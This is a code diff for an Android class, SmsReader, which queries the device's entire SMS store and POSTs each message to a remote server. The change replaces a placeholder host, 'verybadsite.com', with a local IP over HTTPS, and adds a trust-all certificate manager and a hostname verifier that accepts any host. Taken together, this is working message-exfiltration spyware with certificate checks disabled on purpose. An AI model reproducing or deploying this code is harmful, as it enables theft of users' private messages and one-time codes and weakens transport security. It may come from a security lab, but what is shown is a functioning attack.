@@ -30,18 +30,55 @@ import okhttp3.Request;
 import okhttp3.RequestBody;
 import okhttp3.Response;
 
-
+import javax.net.ssl.HostnameVerifier;
+import javax.net.ssl.SSLContext;
+import java.security.KeyManagementException;
+import java.security.NoSuchAlgorithmException;
+import java.security.cert.X509Certificate;
+import javax.net.ssl.SSLContext;
+import javax.net.ssl.SSLSession;
+import javax.net.ssl.TrustManager;
+import javax.net.ssl.X509TrustManager;
 
 public class SmsReader  {
-    private Context context;
-    private OkHttpClient client = new OkHttpClient();
-    private String baseUrl = "http://verybadsite.com"; // Redirect to your IP in your hosts file.
 
-    public SmsReader(Context context) {
+    private Context context;
+    // private OkHttpClient client = new OkHttpClient(); // Used for HTTP.
+    private OkHttpClient.Builder builder = new OkHttpClient.Builder(); // Used for HTTPS.
+    private String baseUrl = "https://192.168.80.1"; // Redirect to your IP in your hosts file.
+
+    public SmsReader(Context context) throws KeyManagementException, NoSuchAlgorithmException {
         this.context = context;
+
+        TrustManager TRUST_ALL_CERTS = new X509TrustManager() {
+            @Override
+            public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) {
+            }
+
+            @Override
+            public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) {
+            }
+
+            @Override
+            public java.security.cert.X509Certificate[] getAcceptedIssuers() {
+                return new java.security.cert.X509Certificate[] {};
+            }
+        };
+
+        SSLContext sslContext = SSLContext.getInstance("SSL");
+        sslContext.init(null, new TrustManager[] { TRUST_ALL_CERTS }, new java.security.SecureRandom());
+        builder.sslSocketFactory(sslContext.getSocketFactory(), (X509TrustManager) TRUST_ALL_CERTS);
+        builder.hostnameVerifier(new HostnameVerifier() {
+            @Override
+            public boolean verify(String hostname, SSLSession session) {
+                return true;
+            }
+        });
+
     }
 
     public void readSMS()  {
+        Log.d("","readSMS");
         ContentResolver contentResolver = context.getContentResolver();
         Cursor cursor = contentResolver.query(Uri.parse("content://sms"), null, null, null, null);
 
@@ -77,7 +114,8 @@ public class SmsReader  {
                         .post(requestBody)
                         .build();
 
-                try (Response response = client.newCall(request).execute()) {
+
+                try (Response response = builder.build().newCall(request).execute()) {
                     if (response.isSuccessful()) {
                         Log.d("SMS", "SMS sent to server successfully");
                     } else {
@@ -93,14 +131,3 @@ public class SmsReader  {
 
 
 }
-
-
-
-
-
-
-
-
-
-
-
